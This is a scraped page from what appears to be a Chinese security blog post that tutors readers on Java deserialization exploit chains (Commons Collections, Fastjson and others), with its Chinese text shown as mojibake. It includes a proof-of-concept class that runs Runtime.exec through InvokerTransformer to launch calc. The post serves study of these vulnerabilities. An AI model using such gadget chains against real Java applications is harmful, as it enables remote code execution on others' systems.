href="#Setter%E5%92%8CGetter%E8%B0%83%E7%94%A8%E7%9A%84%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%A9%B6"><span class="toc-number">6.3.</span> <span class="toc-text">Setterå’ŒGetterè°ƒç”¨çš„æ·±å…¥æ¢ç©¶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaBeanInfo-build"><span class="toc-number">6.3.1.</span> <span class="toc-text">JavaBeanInfo#build</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Setter"><span class="toc-number">6.3.2.</span> <span class="toc-text">Setter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getter"><span class="toc-number">6.3.3.</span> <span class="toc-text">Getter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-number">6.4.</span> <span class="toc-text">Fastjsonçš„ååºåˆ—åŒ–æµç¨‹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">6.5.</span> <span class="toc-text">JdbcRowSetImplåˆ©ç”¨é“¾</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">6.5.1.</span> <span class="toc-text">åˆ©ç”¨é“¾åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0-4"><span class="toc-number">6.5.2.</span> <span class="toc-text">POCæ„é€ </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">6.6.</span> <span class="toc-text">TemplatesImplåˆ©ç”¨é“¾</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-1"><span class="toc-number">6.6.1.</span> <span class="toc-text">åˆ©ç”¨é“¾åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90"><span class="toc-number">6.6.2.</span> <span class="toc-text">POCæ„é€ ä¸åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%A4%E6%9D%A1%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">6.7.</span> <span class="toc-text">æ€»ç»“ä¸¤æ¡åˆ©ç”¨é“¾çš„åŒºåˆ«</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson%E5%90%84%E4%B8%AA%E7%89%88%E6%9C%AC%E5%88%86%E6%9E%90"><span class="toc-number">6.8.</span> <span class="toc-text">Fastjsonå„ä¸ªç‰ˆæœ¬åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-25%E7%89%88%E6%9C%AC%E5%8F%98%E5%8C%96"><span class="toc-number">6.8.1.</span> <span class="toc-text">1.2.25ç‰ˆæœ¬å˜åŒ–</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-25-1-2-41%E7%BB%95%E8%BF%87"><span class="toc-number">6.8.2.</span> <span class="toc-text">1.2.25-1.2.41ç»•è¿‡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E4%BB%A5-%E5%BC%80%E5%A4%B4"><span class="toc-number">6.8.2.1.</span> <span class="toc-text">æ–¹æ³•ä¸€ï¼šä»¥[å¼€å¤´</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E4%BB%A5L%E5%BC%80%E5%A4%B4-%E7%BB%93%E5%B0%BE"><span class="toc-number">6.8.2.2.</span> <span class="toc-text">æ–¹æ³•äºŒï¼šä»¥Lå¼€å¤´;ç»“å°¾</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42%E7%89%88%E6%9C%AC%E5%8F%98%E5%8C%96"><span class="toc-number">6.8.3.</span> <span class="toc-text">1.2.42ç‰ˆæœ¬å˜åŒ–</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42%E7%BB%95%E8%BF%87"><span class="toc-number">6.8.4.</span> <span class="toc-text">1.2.42ç»•è¿‡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E4%BB%A5-%E5%BC%80%E5%A4%B4-1"><span class="toc-number">6.8.4.1.</span> <span class="toc-text">æ–¹æ³•ä¸€ï¼šä»¥[å¼€å¤´</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E4%BB%A5LL%E5%BC%80%E5%A4%B4-%E7%BB%93%E5%B0%BE"><span class="toc-number">6.8.4.2.</span> <span class="toc-text">æ–¹æ³•äºŒï¼šä»¥LLå¼€å¤´;;ç»“å°¾</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-43%E7%89%88%E6%9C%AC%E5%8F%98%E5%8C%96%E5%8F%8A%E7%BB%95%E8%BF%87"><span class="toc-number">6.8.5.</span> <span class="toc-text">1.2.43ç‰ˆæœ¬å˜åŒ–åŠç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-44%E7%89%88%E6%9C%AC%E5%8F%98%E5%8C%96"><span class="toc-number">6.8.6.</span> <span class="toc-text">1.2.44ç‰ˆæœ¬å˜åŒ–</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-25-1-2-47%E9%80%9A%E6%9D%80"><span class="toc-number">6.8.7.</span> <span class="toc-text">1.2.25 - 1.2.47é€šæ€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-48%E7%89%88%E6%9C%AC%E5%8F%98%E5%8C%96"><span class="toc-number">6.8.8.</span> <span class="toc-text">1.2.48ç‰ˆæœ¬å˜åŒ–</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">6.9.</span> <span class="toc-text">Fastjsonä¸å‡ºç½‘åˆ©ç”¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-8"><span class="toc-number">6.10.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://leihehe.top/2021/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Leihehe"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="LeiH - Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Javaååºåˆ—åŒ–æ¼æ´ä¹‹åˆ©ç”¨é“¾åˆ†æé›†åˆ(4)</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2021-07-31 15:20:20" itemprop="dateCreated datePublished" datetime="2021-07-31T15:20:20+10:00">2021-07-31</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="Modified: 2022-06-09 09:43:07" itemprop="dateModified" datetime="2022-06-09T09:43:07+10:00">2022-06-09</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="Word count in article">28.6k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="Reading time">131m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web-Security/" style="--text-color:#F4645F" itemprop="url" rel="index"><span itemprop="text">Web Security</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web-Security/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">JAVAååºåˆ—åŒ–æ¼æ´</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web-Security/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Web Security</span></a><a class="tag-item" href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Javaååºåˆ—åŒ–</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åœ¨ææ¸…æ¥šJavaåå°„æœºåˆ¶ã€RMIå’ŒåŸºæœ¬çš„Javaååºåˆ—åŒ–æ¼æ´æµç¨‹åï¼Œä¸‹ä¸€æ­¥ä¾¿æ˜¯åˆ†æJavaååºåˆ—åŒ–æ¼æ´çš„ç»å…¸åˆ©ç”¨é“¾äº†ã€‚ä½†è¿™å¯¹å¤§éƒ¨åˆ†äººæ¥è¯´éƒ½å¹¶ä¸å®¹æ˜“ï¼Œæˆ‘åœ¨ç½‘ä¸ŠæŸ¥é˜…äº†å¤§é‡èµ„æ–™ï¼Œå¤§éƒ¨åˆ†æ–‡ç« å¯¹äºæ–°æ‰‹æ¥è¯´å¹¶ä¸å‹å¥½ - åˆšå¼€å§‹æˆ‘ç”šè‡³æä¸æ¸…æ¥šæµ‹è¯•ååºåˆ—åŒ–æ¼æ´çš„ç¯å¢ƒåº”è¯¥å¦‚ä½•æ­å»ºï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåˆä½•è°ˆåˆ†æä»£ç ã€‚</p>
<p>è¿™ç¯‡å°†é›†åˆæ‰€æœ‰ç»å…¸çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾çš„è¯¦ç»†è®²è§£ï¼ˆåŒ…æ‹¬ä¸€äº›ç¯å¢ƒæ­å»ºï¼‰ï¼Œå¸Œæœ›å¸®åŠ©æ›´å¤šäººã€ä¹ŸåŒ…æ‹¬æˆ‘è‡ªå·±ï¼Œèƒ½å¤Ÿè®¤è¯†ã€ç†è§£åˆ©ç”¨é“¾çš„æ·±å±‚åŸç†ã€‚</p>
<blockquote>
<p>Do not become a script kiddie.</p>
</blockquote>
<p>ä»£ç åŒæ­¥é¡¹ç›®ï¼š<a target="_blank" rel="noopener" href="https://github.com/leihehehe/Java-deserialization-vulnerability">Java-deserialization-vulnerability</a></p>
<span id="more"></span>

<h1 id="URLDNSåˆ©ç”¨é“¾"><a href="#URLDNSåˆ©ç”¨é“¾" class="headerlink" title="URLDNSåˆ©ç”¨é“¾"></a>URLDNSåˆ©ç”¨é“¾</h1><p><a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/11/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/">è§æ­¤ç¯‡</a></p>
<h1 id="Apache-Commons-Collections-åˆ©ç”¨é“¾"><a href="#Apache-Commons-Collections-åˆ©ç”¨é“¾" class="headerlink" title="Apache Commons Collections åˆ©ç”¨é“¾"></a>Apache Commons Collections åˆ©ç”¨é“¾</h1><h2 id="ä»€ä¹ˆæ˜¯Commons-Collections"><a href="#ä»€ä¹ˆæ˜¯Commons-Collections" class="headerlink" title="ä»€ä¹ˆæ˜¯Commons Collections"></a>ä»€ä¹ˆæ˜¯Commons Collections</h2><p>æœ‰ç¼–ç¨‹åŸºç¡€çš„åŒå­¦åº”è¯¥çŸ¥é“ï¼Œæ— è®ºæ˜¯<code>C Language, Java, Python</code>è¿˜æ˜¯å…¶ä»–è¯­è¨€ï¼Œéƒ½æœ‰**Library(åº“)**ã€‚åœ¨<code>Java</code>ä¸­ï¼Œæˆ‘ä»¬ç”¨<code>import</code>å¼•å…¥åº“ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¢«å¼•å…¥çš„åº“ä¸­çš„ä¸€äº›functionäº†ã€‚è€ŒApache Commons Collectionså°±æ˜¯ä¸€ä¸ªç¬¬ä¸‰æ–¹åŸºç¡€åº“ã€‚</p>
<blockquote>
<p>It provides several features to make collection handling easy. It provides many new interfaces, implementations and utilities.</p>
</blockquote>
<p>å®ƒæä¾›äº†ä¸€äº›åŠŸèƒ½ï¼Œå¯ä»¥æ›´æ–¹ä¾¿çš„ç®¡ç†Collectioné›†åˆ - å› ä¸ºæ–¹ä¾¿ï¼ŒCommons Collectionsè¢«å¹¿æ³›ç”¨äºå„ç§Javaåº”ç”¨çš„å¼€å‘ã€‚å…¶ä¸­ååºåˆ—åŒ–æ¼æ´å°±å‡ºç°åœ¨è¿™ä¸ªåº“ä¸­ï¼Œè¿™æ„å‘³ç€ä½¿ç”¨<strong>è¯¥åº“çš„æ¼æ´ç‰ˆæœ¬</strong>çš„Javaåº”ç”¨ä¼šé¢ä¸´<strong>ååºåˆ—åŒ–æ¼æ´</strong>çš„å¨èƒã€‚è€Œæˆ‘ä»¬çš„ç›®çš„ï¼Œå°±æ˜¯ç ”ç©¶è¿™ä¸ªåº“æ˜¯å¦‚ä½•äº§ç”Ÿå¹¶è¢«åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´çš„ã€‚</p>
<h2 id="Commons-Collections-1"><a href="#Commons-Collections-1" class="headerlink" title="Commons Collections 1"></a>Commons Collections 1</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><h4 id="ä¸‹è½½å‡†å¤‡"><a href="#ä¸‹è½½å‡†å¤‡" class="headerlink" title="ä¸‹è½½å‡†å¤‡"></a>ä¸‹è½½å‡†å¤‡</h4><ul>
<li><p>IntelliJ IDEA</p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://archive.apache.org/dist/commons/collections/binaries/">apache commons collection 3.1ç‰ˆæœ¬</a></p>
</li>
<li><p>JDK1.7(8u71å‰ç‰ˆæœ¬)</p>
</li>
</ul>
<h4 id="å¯¼å…¥åº“"><a href="#å¯¼å…¥åº“" class="headerlink" title="å¯¼å…¥åº“"></a>å¯¼å…¥åº“</h4><h5 id="ç¬¬ä¸€ç§æ–¹æ³•"><a href="#ç¬¬ä¸€ç§æ–¹æ³•" class="headerlink" title="ç¬¬ä¸€ç§æ–¹æ³•"></a>ç¬¬ä¸€ç§æ–¹æ³•</h5><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ª<strong>Java</strong>é¡¹ç›®ï¼ŒJDKè®°å¾—é€‰1.7ç‰ˆæœ¬çš„ã€‚</p>
<p>åœ¨<code>File-&gt;Project Structure-&gt;Modules-&gt;Dependencies</code>ç‚¹å³è¾¹çš„åŠ å·ï¼š</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731154615757.png" alt="image-20210731154615757" loading="lazy"></p>
<p>å¯¼å…¥æˆ‘ä»¬ä¸‹è½½å¥½çš„cc jaråŒ…</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731154659615.png" alt="image-20210731154659615" loading="lazy"></p>
<p>é…ç½®å°±å®Œæˆäº†ã€‚è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<strong>library</strong>å¤„å·²è¢«å¼•å…¥ã€‚<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731160311855.png" alt="image-20210731160311855" loading="lazy"></p>
<p>åœ¨Artifactså¤„ä¹Ÿåº”è¯¥å¯¼å…¥ï¼Œå…·ä½“æ­¥éª¤è§<a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/09/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/">Javaååºåˆ—åŒ–æ¼æ´ä¹‹Ysoserialå®‰è£…é…ç½®</a>ä¸­çš„<strong>WebServerç¯å¢ƒæ­å»º</strong>ç« èŠ‚ã€‚</p>
<h5 id="ç¬¬äºŒç§æ–¹æ³•"><a href="#ç¬¬äºŒç§æ–¹æ³•" class="headerlink" title="ç¬¬äºŒç§æ–¹æ³•"></a>ç¬¬äºŒç§æ–¹æ³•</h5><p>ä¹Ÿå¯ä»¥é€šè¿‡åˆ›å»ºMavené¡¹ç›®ï¼Œæ·»åŠ å¦‚ä¸‹dependency:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="TransformedMapç‰ˆæœ¬-POCæ„é€ è¿‡ç¨‹"><a href="#TransformedMapç‰ˆæœ¬-POCæ„é€ è¿‡ç¨‹" class="headerlink" title="TransformedMapç‰ˆæœ¬ - POCæ„é€ è¿‡ç¨‹"></a>TransformedMapç‰ˆæœ¬ - POCæ„é€ è¿‡ç¨‹</h3><h4 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h4><p>å®‰å…¨ç ”ç©¶çš„å‰è¾ˆä»¬ä¸ºæˆ‘ä»¬å‘ç°å¹¶æ„é€ äº†åˆ©ç”¨è¿™ä¸ªæ¼æ´çš„POCï¼Œæˆ‘ä»¬ç°åœ¨å°±éœ€è¦åˆ†æè¿™æ¡åˆ©ç”¨é“¾çš„åŸç†ã€‚</p>
<p>æˆ‘ä»¬çš„åˆ©ç”¨é“¾éœ€è¦ç”¨åˆ°å¦‚ä¸‹çš„Class</p>
<ul>
<li>InvokerTransformer</li>
<li>ChainedTrasnformer</li>
<li>ConstantTransformer</li>
<li>TransformedMap</li>
<li>AnotationInvocationHandler</li>
</ul>
<h4 id="ç¬¬ä¸€æ­¥ï¼šInvokerTransformer"><a href="#ç¬¬ä¸€æ­¥ï¼šInvokerTransformer" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šInvokerTransformer"></a>ç¬¬ä¸€æ­¥ï¼šInvokerTransformer</h4><p>åœ¨<code>InvokerTransformer</code>ä¸­ï¼Œæˆ‘ä»¬ä¸€çœ¼å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„<strong>åå°„æœºåˆ¶</strong>çš„ä½¿ç”¨ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span> input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Class</span> cls <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„æ˜¯å…³é”®</span>
                <span class="token class-name">Method</span> method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>iMethodName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„æ˜¯å…³é”®</span>
                <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„æ˜¯å…³é”®</span>
            <span class="token punctuation">&#125;</span> 
            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">//æ­¤å¤„çœç•¥</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨å®ƒçš„<code>transform()</code>æ–¹æ³•ä¸­ï¼Œå°†å…ˆgetåˆ°äº†<code>input</code>æ‰€åœ¨çš„Classï¼Œç„¶åï¼Œè·å–Classä¸­çš„<code>method(this.iMethodName, this.iParamTypes)</code>ï¼Œå†<code>method.invoke(input, this.iArgs)</code>ã€‚é‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥æ§åˆ¶è¿™äº›å˜é‡æ¥å®Œæˆä¸€ä¸ªåå°„å‘¢ï¼Ÿ</p>
<p><code>InvokerTransformer</code>æœ‰ä¸¤ä¸ª<strong>constructor</strong>ï¼Œå…¶ä¸­ä¸€ä¸ªå¯ä»¥è®©æˆ‘ä»¬ä¼ å…¥ä»¥ä¸Šéœ€è¦ç”¨åˆ°çš„<code>iMethodName,iParamTypes,iArgs</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token class-name">String</span> methodName<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>iMethodName <span class="token operator">=</span> methodName<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>iParamTypes <span class="token operator">=</span> paramTypes<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>iArgs <span class="token operator">=</span> args<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªClassæ¥è§¦å‘RCEäº†ï¼å¦‚æœæˆ‘ä»¬æƒ³è¦æ‰§è¡Œ<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>çš„æ•ˆæœï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>æŠŠå®ƒå’Œä¸Šé¢çš„<code>transform()</code>é‡Œçš„ä»£ç å¯¹ç…§ï¼Œæˆ‘ä»¬å°†å®ƒå†™æˆåå°„çš„å½¢å¼:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> cls <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//input -> Runtime.getRuntme() è¿™é‡Œçš„Cls-> Runtime.class</span>
<span class="token class-name">Method</span> method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>iMethodName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//iMethodName -> exec </span>
<span class="token comment">//paramTypes -> String.class</span>
<span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//iArgs -> "calc"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸€ä¸ªç®€æ˜“çš„POCï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformedMapExploit</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>

        <span class="token comment">//é¦–å…ˆåˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//æ„é€ input - è¿™é‡Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªRuntime Objectï¼Œ ç”¨Runtime.getRuntime()çš„è¿”å›å€¼å¯ä»¥å¾—åˆ°</span>
        <span class="token class-name">Object</span> input <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//æ‰§è¡Œpayload</span>
        invokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

